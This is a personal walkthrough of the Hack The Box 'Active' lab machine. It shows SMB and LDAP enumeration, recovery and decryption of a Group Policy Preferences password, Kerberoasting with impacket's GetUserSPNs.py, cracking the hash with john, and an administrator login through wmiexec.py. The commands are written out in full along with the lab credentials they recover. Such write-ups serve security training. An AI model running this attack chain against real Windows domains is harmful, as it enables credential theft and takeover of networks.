# Active

Tags: AD-Win
Level: Easy
Status: Done
Date: December 19, 2023

### Nmap

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled.png)

Open Ports are 

88 kerberos

389 ldap

start with ldap search

### Enumeration

Starting ldapsearch

ldapsearch -x -H ldap://10.10.10.100 -D '' -w '' -b "DC=active,DC=htb”

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%201.png)

No interesting information is found.

SMBClient - no information found

```bash
smbclient -L 10.10.10.100
smbclient //10.10.10.100
smbclient ///10.10.10.100
smbclient ////10.10.10.100
smbclient //10.10.10.100/guest
```

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%202.png)

nbtscan

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%203.png)

SMBMAP

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%204.png)

crackmapexec - no much information

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%205.png)

rpcclient - no informaton

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%206.png)

windasearch.py

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%207.png)

nslookup

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%208.png)

Let’s focus on **SMB shares Replication**

```bash
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
```

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%209.png)

Need to use -d debug option no useful information

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%2010.png)

using smbclient

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%2011.png)

using smbmap

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%2012.png)

downloaded Groups.xml file

Using **below command moved to one by one folder and finally found Groups.xml file downloaded using get command** 

```bash
smbclient //10.10.10.100/Replication
```

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%2013.png)

userName=active.htb\SVC_TGS 

cpassword: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

Based on this information searching in google like “**windows group policy password decrypt**” landed on this page 

[Credential Dumping: Group Policy Preferences (GPP) - Hacking Articles](https://www.hackingarticles.in/credential-dumping-group-policy-preferences-gpp/)

In kali linux we have BuildIn tool is **gpp-decrypt**

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%2014.png)

Now username : password 

SVC_TGS : GPPstillStandingStrong2k18

**Download the data from this directory using recurse ON, prompt OFF, mget ***

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%2015.png)

the **active.htb downloaded in local folder**

Finding users using [GetADUsers.py](http://GetADUsers.py) **enter the password correctly** 

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%2016.png)

It has 4 users Administrator, Guest, krbtgt, SVC_TGT 

Trying login into administrator account using psexec.py

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%2017.png)

Because we don’t have writable permission on shares failed

Let’s try smbmap

```bash
smbmap -u active.htb/svc_tgt -p GPPstillStandingStrong2k18 -H 10.10.10.100 # Not Worked
smbmap -u active.htb//svc_tgt -p GPPstillStandingStrong2k18 -H 10.10.10.100 # Not Worked
smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.100 # Working
```

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%2018.png)

### User flag

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%2019.png)

Using ldapsearch finding users

```bash
ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
python3 GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100
python3 GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request
john --wordlist=rockyou.txt hash
python3 wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
```

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%2020.png)

Recently **SVC_TGS user is logged in date and time of Administrator** details

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%2021.png)

Using ldapsearch **find user SPNs - Service Principal Names**

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%2022.png)

Find SPNs using [GetUserSPNs.py](http://GetUserSPNs.py) impacket file

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%2023.png)

Find SPNs using [GetUserSPNs.py](http://GetUserSPNs.py) impacket file finding the request

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%2024.png)

Using john crack the password

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%2025.png)

User name : password

Administrator : Ticketmaster1968

### Root flag

![Untitled](Active%20ec37fc6f605744359081fcff7bf2d03d/Untitled%2026.png)